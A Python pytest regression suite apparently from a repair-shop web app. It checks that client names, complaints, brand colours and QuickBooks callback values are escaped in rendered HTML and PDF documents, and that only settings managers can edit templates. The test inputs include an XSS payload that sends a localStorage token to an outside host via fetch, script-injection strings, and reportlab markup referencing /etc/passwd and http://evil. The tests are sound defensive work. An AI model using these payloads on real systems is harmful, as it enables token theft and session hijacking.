"""Security: record data must be escaped when rendered into printed documents, and only
settings managers may author templates.

Regression for the audit finding where client names, complaints, line descriptions etc. were
substituted into document HTML unescaped, and any employee could create/edit templates — the
rendered HTML then ran in the app's origin when staff printed or previewed it.
"""
import pytest
from sqlalchemy import select

from backend.models import Employee, Organisation, Role
from backend.services.auth import hash_password

XSS = '<img src=x onerror="fetch(\'//x/\'+localStorage.ros_tok)">'


async def _order(client, tenant):
    loc = (await client.get("/api/staff/locations", headers=tenant)).json()["items"][0]["id"]
    cid = (await client.post("/api/clients", json={"name": XSS}, headers=tenant)).json()["id"]
    oid = (await client.post("/api/orders", json={"client_id": cid, "location_id": loc, "complaint": XSS},
                             headers=tenant)).json()["id"]
    await client.post(f"/api/orders/{oid}/lines", json={
        "line_type": "labour", "kind": "service", "description": XSS, "unit_price": 10, "qty": 1}, headers=tenant)
    return oid


@pytest.mark.asyncio
async def test_record_values_are_escaped_in_rendered_documents(client, tenant):
    oid = await _order(client, tenant)
    body = ("<p>{Client Name}</p><p>{Order Complaint}</p><p>{Work Summary}</p>{All Items Table}"
            "<table><tbody><tr><td>{Product Name}</td></tr></tbody></table>"
            "<div style='color:{Brand Color}'>{Approve Button}{QR Code}{Barcode}</div>")
    r = await client.post("/api/documents/preview", json={"body_html": body, "order_id": oid,
                                                          "doc_type": "estimate"}, headers=tenant)
    assert r.status_code == 200, r.text
    html = r.json()["html"]
    assert "<img src=x" not in html and "onerror=\"fetch" not in html
    assert "&lt;img src=x onerror=" in html            # shown as text, not markup
    # deliberate markup still renders as markup
    assert "<table" in html and "<svg" in html and "Approve online" in html


@pytest.mark.asyncio
async def test_brand_color_cannot_break_out_of_style(client, tenant, db):
    org = (await db.execute(select(Organisation))).scalars().first()
    org.brand_primary_color = '#000;"><script>alert(1)</script>'
    await db.commit()
    oid = await _order(client, tenant)
    r = await client.post("/api/documents/preview", json={"body_html": "{Approve Button}", "order_id": oid,
                                                          "doc_type": "estimate"}, headers=tenant)
    assert "<script>" not in r.json()["html"]


@pytest.mark.asyncio
async def test_only_settings_managers_can_author_templates(client, tenant, db):
    org = (await db.execute(select(Organisation))).scalars().first()
    owner = (await db.execute(select(Employee).where(Employee.org_id == org.id))).scalars().first()
    role = Role(org_id=org.id, name="Tech", permissions={"can_manage_settings": False})
    db.add(role)
    await db.flush()
    db.add(Employee(org_id=org.id, location_id=owner.location_id, role_id=role.id, name="T",
                    email="t@tplxss.test", password_hash=hash_password("pw-tech-12345"), active=True))
    await db.commit()
    tok = (await client.post("/api/auth/token", data={"username": "t@tplxss.test",
                                                      "password": "pw-tech-12345"})).json()["access_token"]
    th = {"Authorization": f"Bearer {tok}"}
    tpl = {"name": "x", "doc_type": "estimate", "body_html": "<p>hi</p>"}
    assert (await client.post("/api/documents/templates", json=tpl, headers=th)).status_code == 403
    tid = (await client.post("/api/documents/templates", json=tpl, headers=tenant)).json()["id"]
    assert (await client.put(f"/api/documents/templates/{tid}", json=tpl, headers=th)).status_code == 403
    assert (await client.delete(f"/api/documents/templates/{tid}", headers=th)).status_code == 403


@pytest.mark.asyncio
async def test_qbo_callback_never_reflects_realm_markup(client, tenant, monkeypatch):
    """Valid signed state (the attacker's own connect flow) + a tampered realmId."""
    from urllib.parse import parse_qs, urlparse

    from backend.config import settings
    monkeypatch.setattr(settings, "QBO_CLIENT_ID", "cid")
    monkeypatch.setattr(settings, "QBO_CLIENT_SECRET", "csecret")

    async def _fake_exchange(code):
        return {"access_token": "at", "refresh_token": "rt", "expires_in": 3600}
    monkeypatch.setattr("backend.services.qbo._exchange_code", _fake_exchange)
    auth_url = (await client.get("/api/integrations/qbo/connect", headers=tenant)).json()["auth_url"]
    state = parse_qs(urlparse(auth_url).query)["state"][0]
    r = await client.get("/api/integrations/qbo/callback",
                         params={"code": "c", "realmId": "<script>alert(1)</script>", "state": state})
    assert r.status_code == 400 and "<script>" not in r.text


def test_pdf_paragraph_text_is_escaped(monkeypatch):
    """reportlab parses Paragraph text as markup (<img src>, <link>, <font>): data must arrive escaped."""
    from backend.services import printing
    seen = []
    real = printing.Paragraph

    def spy(text, *a, **kw):
        seen.append(text)
        return real(text, *a, **kw)
    monkeypatch.setattr(printing, "Paragraph", spy)
    pdf = printing.render_document(title="PO", number="1", org_name="<img src='/etc/passwd'/>Shop",
                                   meta=[("Supplier", "<link href='http://evil'>x</link>")],
                                   headers=["A"], rows=[["1"]], totals=[], footer="<font name='x'>")
    assert pdf.startswith(b"%PDF")
    joined = " ".join(seen)
    assert "<img" not in joined and "<link" not in joined and "<font" not in joined
    assert "&lt;img src=" in joined
